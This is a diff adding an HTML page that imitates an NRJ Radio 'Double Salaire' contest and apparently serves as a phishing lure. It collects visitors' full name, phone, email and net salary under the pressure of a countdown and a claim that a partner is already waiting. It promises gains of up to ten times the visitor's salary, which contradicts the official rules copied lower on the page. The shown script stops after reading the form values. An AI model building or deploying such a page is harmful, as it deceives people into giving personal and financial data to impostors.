@@ -1,0 +1,1506 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NRJ Double Salaire | Manu dans le 6/10 | NRJ Radio</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800&family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <style>
+        /* ========== RESET & BASE ========== */
+        :root {
+            --nrj-red: #E2001A;
+            --nrj-dark-red: #C00015;
+            --nrj-black: #121212;
+            --nrj-dark-gray: #222222;
+            --nrj-gray: #444444;
+            --nrj-light-gray: #f8f9fa;
+            --nrj-white: #FFFFFF;
+            --transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+            --shadow-sm: 0 1px 2px rgba(0,0,0,0.05);
+            --shadow-md: 0 4px 6px rgba(0,0,0,0.1);
+            --shadow-lg: 0 10px 15px rgba(0,0,0,0.1);
+            --shadow-xl: 0 20px 25px rgba(0,0,0,0.1);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            color: var(--nrj-dark-gray);
+            background-color: var(--nrj-white);
+            line-height: 1.7;
+            overflow-x: hidden;
+        }
+
+        h1, h2, h3, h4, h5, h6 {
+            font-family: 'Montserrat', sans-serif;
+            font-weight: 700;
+            line-height: 1.2;
+        }
+
+        a {
+            text-decoration: none;
+            color: inherit;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+        }
+
+        ul {
+            list-style: none;
+        }
+
+        button, input, textarea, select {
+            font-family: inherit;
+            font-size: inherit;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 1320px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        .section {
+            padding: 100px 0;
+            position: relative;
+        }
+
+        .section-title {
+            font-size: 2.8rem;
+            margin-bottom: 2rem;
+            position: relative;
+            display: inline-block;
+            font-weight: 800;
+        }
+
+        .section-title::after {
+            content: '';
+            position: absolute;
+            bottom: -10px;
+            left: 0;
+            width: 60px;
+            height: 4px;
+            background-color: var(--nrj-red);
+        }
+
+        .btn {
+            display: inline-block;
+            padding: 15px 40px;
+            border-radius: 50px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            transition: var(--transition);
+            border: none;
+            cursor: pointer;
+            font-size: 1rem;
+        }
+
+        .btn-primary {
+            background-color: var(--nrj-red);
+            color: var(--nrj-white);
+            box-shadow: var(--shadow-sm);
+        }
+
+        .btn-primary:hover {
+            background-color: var(--nrj-dark-red);
+            transform: translateY(-3px);
+            box-shadow: var(--shadow-md);
+        }
+
+        .btn-outline {
+            background-color: transparent;
+            color: var(--nrj-red);
+            border: 2px solid var(--nrj-red);
+        }
+
+        .btn-outline:hover {
+            background-color: var(--nrj-red);
+            color: var(--nrj-white);
+            transform: translateY(-3px);
+            box-shadow: var(--shadow-sm);
+        }
+
+        .text-center {
+            text-align: center;
+        }
+
+        .text-center .section-title::after {
+            left: 50%;
+            transform: translateX(-50%);
+        }
+
+        /* ========== HEADER ========== */
+        .header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            z-index: 1000;
+            background-color: var(--nrj-white);
+            box-shadow: var(--shadow-sm);
+            transition: var(--transition);
+        }
+
+        .header.scrolled {
+            background-color: rgba(255, 255, 255, 0.95);
+            box-shadow: var(--shadow-md);
+        }
+
+        .header-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            height: 60px;
+        }
+
+        .logo {
+            height: 35px;
+            display: flex;
+            align-items: center;
+        }
+
+        .logo img {
+            height: 100%;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 30px;
+        }
+
+        .nav-link {
+            font-weight: 600;
+            color: var(--nrj-black);
+            position: relative;
+            padding: 5px 0;
+            transition: var(--transition);
+        }
+
+        .nav-link::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 0;
+            height: 2px;
+            background-color: var(--nrj-red);
+            transition: var(--transition);
+        }
+
+        .nav-link:hover {
+            color: var(--nrj-red);
+        }
+
+        .nav-link:hover::after {
+            width: 100%;
+        }
+
+        .nav-link.active {
+            color: var(--nrj-red);
+        }
+
+        .nav-link.active::after {
+            width: 100%;
+        }
+
+        .mobile-menu-btn {
+            display: none;
+            background: none;
+            border: none;
+            font-size: 1.5rem;
+            color: var(--nrj-black);
+            cursor: pointer;
+        }
+
+        /* ========== ABOUT CONTEST ========== */
+        .about-contest {
+            background-color: var(--nrj-white);
+            padding-top: 80px;
+        }
+
+        .about-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 50px;
+            align-items: center;
+        }
+
+        .about-image {
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: var(--shadow-lg);
+        }
+
+        .about-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .about-content h2 {
+            margin-bottom: 1.5rem;
+        }
+
+        .about-content p {
+            margin-bottom: 1.5rem;
+            font-size: 1.1rem;
+        }
+
+        .features-list {
+            margin-top: 2rem;
+        }
+
+        .feature-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 15px;
+            margin-bottom: 1.5rem;
+        }
+
+        .feature-icon {
+            color: var(--nrj-red);
+            font-size: 1.5rem;
+            flex-shrink: 0;
+        }
+
+        .feature-text h4 {
+            margin-bottom: 0.5rem;
+            color: var(--nrj-black);
+        }
+
+        /* ========== COUNTDOWN ========== */
+        .countdown {
+            background-color: var(--nrj-red);
+            color: var(--nrj-white);
+        }
+
+        .countdown .section-title::after {
+            background-color: var(--nrj-white);
+        }
+
+        .countdown-timer {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin-top: 3rem;
+        }
+
+        .countdown-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .countdown-number {
+            font-size: 3rem;
+            font-weight: 700;
+            line-height: 1;
+        }
+
+        .countdown-label {
+            font-size: 1rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        /* ========== RECENT WINNERS ========== */
+        .recent-winners {
+            background-color: var(--nrj-light-gray);
+        }
+
+        .winners-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 30px;
+            margin-top: 3rem;
+        }
+
+        .winner-card {
+            background-color: var(--nrj-white);
+            padding: 2rem;
+            border-radius: 10px;
+            box-shadow: var(--shadow-md);
+            text-align: center;
+            transition: var(--transition);
+        }
+
+        .winner-card:hover {
+            transform: translateY(-5px);
+            box-shadow: var(--shadow-lg);
+        }
+
+        .winner-name {
+            font-size: 1.2rem;
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+        }
+
+        .winner-prize {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--nrj-red);
+        }
+
+        /* ========== PARTICIPATION ========== */
+        .participation {
+            background-color: var(--nrj-light-gray);
+        }
+
+        .participation-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 50px;
+        }
+
+        .participation-steps {
+            background-color: var(--nrj-white);
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: var(--shadow-md);
+        }
+
+        .steps-title {
+            font-size: 1.8rem;
+            margin-bottom: 1.5rem;
+            color: var(--nrj-red);
+        }
+
+        .step {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 2rem;
+            position: relative;
+        }
+
+        .step:not(:last-child)::after {
+            content: '';
+            position: absolute;
+            left: 21px;
+            top: 40px;
+            bottom: -25px;
+            width: 2px;
+            background-color: var(--nrj-red);
+            opacity: 0.3;
+        }
+
+        .step-number {
+            width: 40px;
+            height: 40px;
+            background-color: var(--nrj-red);
+            color: var(--nrj-white);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            flex-shrink: 0;
+        }
+
+        .step-content h4 {
+            margin-bottom: 0.5rem;
+            color: var(--nrj-black);
+        }
+
+        .participation-form-container {
+            background-color: var(--nrj-white);
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: var(--shadow-md);
+        }
+
+        .form-title {
+            font-size: 1.8rem;
+            margin-bottom: 1.5rem;
+            color: var(--nrj-red);
+        }
+
+        .form-description {
+            margin-bottom: 2rem;
+            color: var(--nrj-gray);
+        }
+
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 500;
+            color: var(--nrj-black);
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 1rem;
+            transition: var(--transition);
+        }
+
+        .form-control:focus {
+            outline: none;
+            border-color: var(--nrj-red);
+            box-shadow: 0 0 0 3px rgba(226, 0, 26, 0.1);
+        }
+
+        .form-submit {
+            width: 100%;
+            padding: 15px;
+            background-color: var(--nrj-red);
+            color: var(--nrj-white);
+            border: none;
+            border-radius: 5px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            cursor: pointer;
+            transition: var(--transition);
+        }
+
+        .form-submit:hover {
+            background-color: var(--nrj-dark-red);
+            transform: translateY(-3px);
+            box-shadow: var(--shadow-sm);
+        }
+
+        /* ========== PRIZE CALCULATOR ========== */
+        .prize-calculator {
+            background-color: var(--nrj-red);
+            color: var(--nrj-white);
+            padding: 80px 0;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .prize-calculator::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('https://source.unsplash.com/random/1920x1080/?money') no-repeat center center/cover;
+            opacity: 0.1;
+            z-index: 0;
+        }
+
+        .prize-calculator .container {
+            position: relative;
+            z-index: 1;
+        }
+
+        .prize-calculator .section-title {
+            color: var(--nrj-white);
+        }
+
+        .prize-calculator .section-title::after {
+            background-color: var(--nrj-white);
+        }
+
+        .calculator-container {
+            max-width: 800px;
+            margin: 0 auto;
+            background-color: var(--nrj-white);
+            border-radius: 10px;
+            padding: 40px;
+            box-shadow: var(--shadow-xl);
+            color: var(--nrj-black);
+        }
+
+        .calculator-title {
+            font-size: 1.8rem;
+            margin-bottom: 1.5rem;
+            color: var(--nrj-red);
+        }
+
+        .calculator-description {
+            margin-bottom: 2rem;
+            color: var(--nrj-gray);
+        }
+
+        .loading-spinner {
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            border-left-color: var(--nrj-red);
+            animation: spin 1s ease infinite;
+            margin: 2rem auto;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .calculator-result {
+            display: none;
+            margin-top: 2rem;
+            padding: 2rem;
+            background-color: var(--nrj-light-gray);
+            border-radius: 10px;
+            border-left: 5px solid var(--nrj-red);
+        }
+
+        .result-title {
+            font-size: 1.5rem;
+            margin-bottom: 1rem;
+            color: var(--nrj-red);
+        }
+
+        .result-details {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin-top: 1.5rem;
+        }
+
+        .result-item {
+            margin-bottom: 1rem;
+        }
+
+        .result-label {
+            font-weight: 500;
+            color: var(--nrj-gray);
+            display: block;
+            margin-bottom: 0.25rem;
+        }
+
+        .result-value {
+            font-weight: 600;
+            color: var(--nrj-black);
+            font-size: 1.1rem;
+        }
+
+        .prize-amount {
+            font-size: 2.5rem;
+            font-weight: 800;
+            color: var(--nrj-red);
+            margin: 1rem 0;
+        }
+
+        /* ========== RULES ========== */
+        .rules {
+            background-color: var(--nrj-white);
+        }
+
+        .rules-container {
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+
+        .rules-article {
+            margin-bottom: 3rem;
+        }
+
+        .rules-article-title {
+            font-size: 1.5rem;
+            margin-bottom: 1rem;
+            color: var(--nrj-red);
+            padding-bottom: 0.5rem;
+            border-bottom: 2px solid var(--nrj-light-gray);
+        }
+
+        .rules-article-content p {
+            margin-bottom: 1rem;
+        }
+
+        .rules-article-content ul {
+            margin-bottom: 1rem;
+            padding-left: 1.5rem;
+        }
+
+        .rules-article-content li {
+            margin-bottom: 0.5rem;
+            position: relative;
+        }
+
+        .rules-article-content li::before {
+            content: '•';
+            color: var(--nrj-red);
+            font-weight: bold;
+            position: absolute;
+            left: -1rem;
+        }
+
+        /* ========== FOOTER ========== */
+        .footer {
+            background-color: var(--nrj-black);
+            color: var(--nrj-white);
+            padding: 80px 0 0;
+        }
+
+        .footer-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 40px;
+            margin-bottom: 60px;
+        }
+
+        .footer-logo {
+            margin-bottom: 1.5rem;
+        }
+
+        .footer-logo img {
+            height: 40px;
+        }
+
+        .footer-about p {
+            margin-bottom: 1.5rem;
+            color: #aaa;
+        }
+
+        .social-links {
+            display: flex;
+            gap: 15px;
+        }
+
+        .social-link {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background-color: var(--nrj-dark-gray);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--nrj-white);
+            transition: var(--transition);
+        }
+
+        .social-link:hover {
+            background-color: var(--nrj-red);
+            transform: translateY(-3px);
+        }
+
+        .footer-title {
+            font-size: 1.2rem;
+            margin-bottom: 1.5rem;
+            color: var(--nrj-white);
+            position: relative;
+            padding-bottom: 10px;
+        }
+
+        .footer-title::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 40px;
+            height: 2px;
+            background-color: var(--nrj-red);
+        }
+
+        .footer-links li {
+            margin-bottom: 0.75rem;
+        }
+
+        .footer-link {
+            color: #aaa;
+            transition: var(--transition);
+        }
+
+        .footer-link:hover {
+            color: var(--nrj-white);
+            padding-left: 5px;
+        }
+
+        .newsletter-form {
+            margin-top: 1.5rem;
+        }
+
+        .newsletter-input {
+            width: 100%;
+            padding: 12px 15px;
+            margin-bottom: 10px;
+            border: none;
+            border-radius: 5px;
+            font-size: 1rem;
+        }
+
+        .newsletter-submit {
+            width: 100%;
+            padding: 12px;
+            background-color: var(--nrj-red);
+            color: var(--nrj-white);
+            border: none;
+            border-radius: 5px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: var(--transition);
+        }
+
+        .newsletter-submit:hover {
+            background-color: var(--nrj-dark-red);
+        }
+
+        .footer-bottom {
+            padding: 20px 0;
+            border-top: 1px solid var(--nrj-dark-gray);
+        }
+
+        .copyright {
+            text-align: center;
+            color: #777;
+            font-size: 0.9rem;
+        }
+
+        /* ========== ANIMATIONS ========== */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+
+        .animate-fade {
+            animation: fadeIn 1s ease-out forwards;
+        }
+
+        .animate-pulse {
+            animation: pulse 2s infinite;
+        }
+
+        /* ========== RESPONSIVE ========== */
+        @media (max-width: 992px) {
+            .section {
+                padding: 60px 0;
+            }
+
+            .hero-title {
+                font-size: 3rem;
+            }
+
+            .hero-subtitle {
+                font-size: 1.25rem;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .mobile-menu-btn {
+                display: block;
+            }
+
+            .nav-links {
+                position: fixed;
+                top: 80px;
+                left: -100%;
+                width: 100%;
+                height: calc(100vh - 80px);
+                background-color: var(--nrj-white);
+                flex-direction: column;
+                align-items: center;
+                justify-content: center;
+                gap: 30px;
+                transition: var(--transition);
+            }
+
+            .nav-links.active {
+                left: 0;
+            }
+
+            .hero-title {
+                font-size: 2.5rem;
+            }
+
+            .hero-buttons {
+                flex-direction: column;
+                gap: 15px;
+            }
+
+            .btn {
+                width: 100%;
+                text-align: center;
+            }
+        }
+
+        @media (max-width: 576px) {
+            .section {
+                padding: 50px 0;
+            }
+
+            .section-title {
+                font-size: 2rem;
+            }
+
+            .hero {
+                min-height: 600px;
+            }
+
+            .hero-title {
+                font-size: 2rem;
+            }
+
+            .hero-subtitle {
+                font-size: 1.1rem;
+            }
+
+            .calculator-container {
+                padding: 30px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div class="container header-container">
+            <a href="#" class="logo">
+                <img src="Nrj2014.png" alt="NRJ Radio">
+            </a>
+            
+            <nav class="nav">
+                <ul class="nav-links">
+                    <li><a href="#" class="nav-link active">Accueil</a></li>
+                    <li><a href="#participer" class="nav-link">Participer</a></li>
+                    <li><a href="#reglement" class="nav-link">Règlement</a></li>
+                    <li><a href="#contact" class="nav-link">Contact</a></li>
+                </ul>
+            </nav>
+            
+            <button class="mobile-menu-btn">
+                ☰
+            </button>
+        </div>
+    </header>
+
+    <!-- About Contest Section -->
+    <section class="section about-contest">
+        <div class="container">
+            <div class="about-container">
+                <div class="about-image">
+                    <img src="118359972_3328742377214780_8083952334454523121_n.jpg" alt="Concours NRJ Double Salaire">
+                </div>
+                
+                <div class="about-content">
+                    <h2 class="section-title">Concours NRJ Double Salaire</h2>
+                    <p>Le concours NRJ Double Salaire vous offre une opportunité unique de multiplier vos revenus ! En partenariat avec l'émission "Manu dans le 6/10", nous offrons chaque jour des gains exceptionnels à nos auditeurs.</p>
+                    <p>Le principe est simple : formez un duo avec un autre participant et tentez de gagner un multiple de votre salaire mensuel. Le coefficient multiplicateur est aléatoire (entre 4 et 10) pour plus de suspense !</p>
+                    
+                    <div class="features-list">
+                        <div class="feature-item">
+                            <div class="feature-icon">✓</div>
+                            <div class="feature-text">
+                                <h4>Gains importants</h4>
+                                <p>Jusqu'à 10 fois votre salaire mensuel</p>
+                            </div>
+                        </div>
+                        
+                        <div class="feature-item">
+                            <div class="feature-icon">✓</div>
+                            <div class="feature-text">
+                                <h4>Participation en duo</h4>
+                                <p>Un premier participant est déjà inscrit, il ne manque plus que vous !</p>
+                            </div>
+                        </div>
+                        
+                        <div class="feature-item">
+                            <div class="feature-icon">✓</div>
+                            <div class="feature-text">
+                                <h4>Résultats instantanés</h4>
+                                <p>Découvrez immédiatement votre gain potentiel</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Countdown Section -->
+    <section class="section countdown">
+        <div class="container text-center">
+            <h2 class="section-title">Le concours se termine dans</h2>
+            <div id="countdown-timer" class="countdown-timer">
+                <div class="countdown-item">
+                    <span id="days" class="countdown-number">1</span>
+                    <span class="countdown-label">Jours</span>
+                </div>
+                <div class="countdown-item">
+                    <span id="hours" class="countdown-number">00</span>
+                    <span class="countdown-label">Heures</span>
+                </div>
+                <div class="countdown-item">
+                    <span id="minutes" class="countdown-number">00</span>
+                    <span class="countdown-label">Minutes</span>
+                </div>
+                <div class="countdown-item">
+                    <span id="seconds" class="countdown-number">00</span>
+                    <span class="countdown-label">Secondes</span>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Recent Winners Section -->
+    <section class="section recent-winners">
+        <div class="container">
+            <h2 class="section-title text-center">Derniers gagnants</h2>
+            <div class="winners-container" id="winners-container">
+                <!-- Winner cards will be dynamically inserted here -->
+            </div>
+        </div>
+    </section>
+
+    <!-- Participation Section -->
+    <section class="section participation" id="participer">
+        <div class="container">
+            <h2 class="section-title text-center">Comment participer ?</h2>
+            
+            <div class="participation-container">
+                <div class="participation-steps">
+                    <h3 class="steps-title">Premier participant </h3>
+                    
+                    <div class="step">
+                        <div class="step-number">1</div>
+                        <div class="step-content">
+                            <h4>Premier participant inscrit</h4>
+                            <p>Un premier participant a déjà complété son inscription avec succès. Le duo est en attente de votre participation.</p>
+                        </div>
+                    </div>
+                    
+                    <div class="step">
+                        <div class="step-number">2</div>
+                        <div class="step-content">
+                            <h4>Remplissez vos informations</h4>
+                            <p>Complétez le formulaire avec vos coordonnées exactes et votre salaire mensuel net.</p>
+                        </div>
+                    </div>
+                    
+                    <div class="step">
+                        <div class="step-number">3</div>
+                        <div class="step-content">
+                            <h4>Calcul du gain</h4>
+                            <p>Votre salaire sera multiplié par un coefficient aléatoire entre 4 et 10 pour déterminer votre gain.</p>
+                        </div>
+                    </div>
+                    
+                    <div class="step">
+                        <div class="step-number">4</div>
+                        <div class="step-content">
+                            <h4>Validation finale</h4>
+                            <p>Validez votre participation pour finaliser le duo et enregistrer votre chance de gagner.</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="participation-form-container">
+                    <h3 class="form-title">Deuxième participant</h3>
+                    <p class="form-description">Remplissez ce formulaire pour compléter le duo et découvrir votre gain potentiel.</p>
+                    
+                    <form id="participationForm">
+                        <div class="form-group">
+                            <label for="fullName" class="form-label">Nom complet</label>
+                            <input type="text" id="fullName" class="form-control" required>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="country" class="form-label">Pays</label>
+                            <select id="country" class="form-control" required>
+                                <option value="" selected disabled>Choisissez votre pays</option>
+                                <option value="France">France</option>
+                                <option value="Belgique">Belgique</option>
+                                <option value="Suisse">Suisse</option>
+                                <option value="Luxembourg">Luxembourg</option>
+                                <option value="Canada">Canada</option>
+                                <option value="Autre">Autre</option>
+                            </select>
+                        </div>
+                        
+                        
+                        <div class="form-group">
+                            <label for="phone" class="form-label">Numéro de téléphone</label>
+                            <input type="tel" id="phone" class="form-control" required>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="email" class="form-label">Adresse email</label>
+                            <input type="email" id="email" class="form-control" required>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="phone" class="form-label">Salaire mensuel net (€)</label>
+                            <input type="tel" id="salary" class="form-control" min="0" step="0.01" required>
+                        </div>
+                        
+                        <button type="submit" class="form-submit">CALCULER MON GAIN</button>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Prize Calculator Section -->
+    <section class="section prize-calculator">
+        <div class="container">
+            <h2 class="section-title text-center">Votre gain potentiel</h2>
+            
+            <div class="calculator-container">
+                <h3 class="calculator-title">Simulateur de gain</h3>
+                <p class="calculator-description">Après avoir soumis le formulaire, votre gain potentiel sera calculé automatiquement en multipliant votre salaire par un coefficient aléatoire entre 4 et 10.</p>
+                
+                <div class="loading-spinner" id="loadingSpinner" style="display: none;"></div>
+
+                <div class="calculator-result" id="calculatorResult" style="display: none;">
+                    <h4 class="result-title">Félicitations ! Voici votre gain potentiel</h4>
+                    <div class="prize-amount" id="prizeAmount">0 €</div>
+                    
+                    <div class="result-details">
+                        <div class="result-item">
+                            <span class="result-label">Nom complet</span>
+                            <span class="result-value" id="resultName">-</span>
+                        </div>
+                        
+                        <div class="result-item">
+                            <span class="result-label">Téléphone</span>
+                            <span class="result-value" id="resultPhone">-</span>
+                        </div>
+                        
+                        <div class="result-item">
+                            <span class="result-label">Email</span>
+                            <span class="result-value" id="resultEmail">-</span>
+                        </div>
+                        
+                        <div class="result-item">
+                            <span class="result-label">Salaire de base</span>
+                            <span class="result-value" id="resultSalary">- €</span>
+                        </div>
+                        
+                        <div class="result-item">
+                            <span class="result-label">Coefficient</span>
+                            <span class="result-value" id="resultCoefficient">-</span>
+                        </div>
+                    </div>
+                    
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Rules Section -->
+    <section class="section rules" id="reglement">
+        <div class="container">
+            <h2 class="section-title text-center">Règlement du jeu</h2>
+            
+            <div class="rules-container">
+                <article class="rules-article">
+                    <h3 class="rules-article-title">ARTICLE 1 : ORGANISATION</h3>
+                    <div class="rules-article-content">
+                        <p>La société NRJ, société par actions simplifiée au capital de 10.421.222 euros, immatriculée au RCS de Paris sous le numéro 328 232 731, dont le siège est situé 22 rue Boileau 75016 Paris (ci-après la « Société Organisatrice »), organise sur son antenne radiophonique « NRJ » (ci-après la « Radio ») du lundi 26 août 2024 à 6 heures au vendredi 27 juin 2025 à 10 heures inclus un jeu gratuit et sans obligation d'achat intitulé « NRJ double votre salaire dans le 6/10 » (ci‑après le « Jeu »).</p>
+                    </div>
+                </article>
+                
+                <article class="rules-article">
+                    <h3 class="rules-article-title">ARTICLE 2 : CONDITIONS D'INSCRIPTION</h3>
+                    <div class="rules-article-content">
+                        <p>L'inscription au Jeu est exclusivement ouverte aux personnes remplissant les conditions cumulatives suivantes :</p>
+                        <ul>
+                            <li>toute personne physique salariée et majeure au moment de son inscription au Jeu - toute personne physique mineure et salariée qui s'inscrirait au Jeu sera réputée participer sous le contrôle et avec le consentement de ses parents ou du ou des titulaire(s) de l'autorité parentale, ou à défaut de ses tuteurs légaux dont la justification lui sera demandée en cas de gain ;</li>
+                            <li>résidant en France métropolitaine et travaillant en France Métropolitaine ;</li>
+                            <li>dont le salaire net mensuel imposable pour le mois précédant son inscription (tel qu'indiqué dans la rubrique « net imposable » du bulletin de salaire correspondant) est inférieur ou égal à 2.000 (deux mille) euros.</li>
+                        </ul>
+                        <p>Ne peuvent s'inscrire au Jeu les membres du personnel permanent ou temporaire de la Société Organisatrice, du groupe auquel elle appartient, des sociétés partenaires, des sociétés ayant participé directement et/ou indirectement à la promotion et/ou à la réalisation du Jeu ou de la SCP Stéphane EMERY - Thierry LUCIANI & Associés, Huissiers de Justice Associés, sis 11 rue de Milan, 75009 Paris, ainsi qu'aux membres de leur foyer ou de leur famille (conjoint, concubin, ascendant, descendant direct, frère, sœur, etc.)</p>
+                    </div>
+                </article>
+                
+                <!-- More articles can be added here -->
+                
+                <article class="rules-article">
+                    <h3 class="rules-article-title">ARTICLE 14 : AUTORISATIONS</h3>
+                    <div class="rules-article-content">
+                        <p>Tout participant dont la participation est diffusée à l'antenne de la Radio à l'occasion du Jeu, autorise la Société Organisatrice à utiliser, en tout ou partie, son prénom et sa voix captée lors de son passage à l'antenne, par tous moyens et procédés, et sur tous supports notamment à l'antenne de la Radio, en direct ou en différé, pour les besoins du Jeu ou de la promotion du Jeu ou de la Société Organisatrice, ce pendant une durée de 1 (un) an à compter de la date de la Session de Jeu et pour la France, sans que cette utilisation puisse donner lieu à une quelconque contrepartie.</p>
+                    </div>
+                </article>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="footer" id="contact">
+        <div class="container">
+            <div class="footer-container">
+                <div class="footer-about">
+                    <div class="footer-logo">
+                        <img src="Nrj2014.png" alt="NRJ Radio">
+                    </div>
+                    <p>NRJ, la radio numéro 1 en France, vous propose les meilleurs hits, des émissions exclusives et des concours exceptionnels comme "Double Salaire".</p>
+                    <div class="social-links">
+                        <a href="#" class="social-link">f</a>
+                        <a href="#" class="social-link">t</a>
+                        <a href="#" class="social-link">i</a>
+                        <a href="#" class="social-link">y</a>
+                    </div>
+                </div>
+                
+                <div class="footer-links">
+                    <h3 class="footer-title">Liens rapides</h3>
+                    <ul>
+                        <li><a href="#" class="footer-link">Accueil</a></li>
+                        <li><a href="#participer" class="footer-link">Participer au concours</a></li>
+                        <li><a href="#reglement" class="footer-link">Règlement du jeu</a></li>
+                        <li><a href="#" class="footer-link">NRJ Music Awards</a></li>
+                        <li><a href="#" class="footer-link">Fréquences NRJ</a></li>
+                    </ul>
+                </div>
+                
+                <div class="footer-links">
+                    <h3 class="footer-title">Émissions</h3>
+                    <ul>
+                        <li><a href="#" class="footer-link">Manu dans le 6/10</a></li>
+                        <li><a href="#" class="footer-link">Le Morning NRJ</a></li>
+                        <li><a href="#" class="footer-link">Hit Weekend</a></li>
+                        <li><a href="#" class="footer-link">NRJ Non Stop</a></li>
+                        <li><a href="#" class="footer-link">Top 50</a></li>
+                    </ul>
+                </div>
+                
+                <div class="footer-newsletter">
+                    <h3 class="footer-title">Newsletter</h3>
+                    <p>Abonnez-vous à notre newsletter pour recevoir les dernières actualités et les prochains concours.</p>
+                    <form class="newsletter-form">
+                        <input type="email" placeholder="Votre email" class="newsletter-input" required>
+                        <button type="submit" class="newsletter-submit">S'abonner</button>
+                    </form>
+                </div>
+            </div>
+            
+            <div class="footer-bottom">
+                <p class="copyright">&copy; 2024 NRJ Radio. Tous droits réservés. | <a href="#">Mentions légales</a> | <a href="#">Politique de confidentialité</a> | <a href="#">CGU</a></p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Mobile Menu Toggle
+        const mobileMenuBtn = document.querySelector('.mobile-menu-btn');
+        const navLinks = document.querySelector('.nav-links');
+        
+        mobileMenuBtn.addEventListener('click', () => {
+            navLinks.classList.toggle('active');
+            mobileMenuBtn.innerHTML = navLinks.classList.contains('active') ? '✕' : '☰';
+        });
+        
+        // Header Scroll Effect
+        const header = document.querySelector('.header');
+        
+        window.addEventListener('scroll', () => {
+            if (window.scrollY > 50) {
+                header.classList.add('scrolled');
+            } else {
+                header.classList.remove('scrolled');
+            }
+        });
+        
+        // Form Submission
+        const participationForm = document.getElementById('participationForm');
+        const calculatorResult = document.getElementById('calculatorResult');
+        const loadingSpinner = document.getElementById('loadingSpinner');
+        const prizeAmount = document.getElementById('prizeAmount');
+        const resultName = document.getElementById('resultName');
+        const resultPhone = document.getElementById('resultPhone');
+        const resultEmail = document.getElementById('resultEmail');
+        const resultSalary = document.getElementById('resultSalary');
+        const resultCoefficient = document.getElementById('resultCoefficient');
+        
+        participationForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            
+            // Get form values
+            const fullName = document.getElementById('fullName').value;
+            const country = document.getElementById('country').value;
+            const phone = document.getElementById('phone').value;
+            const email = document.getElementById('email').value;
+            const salary = parseFloat(document.getElementById('salary').value);
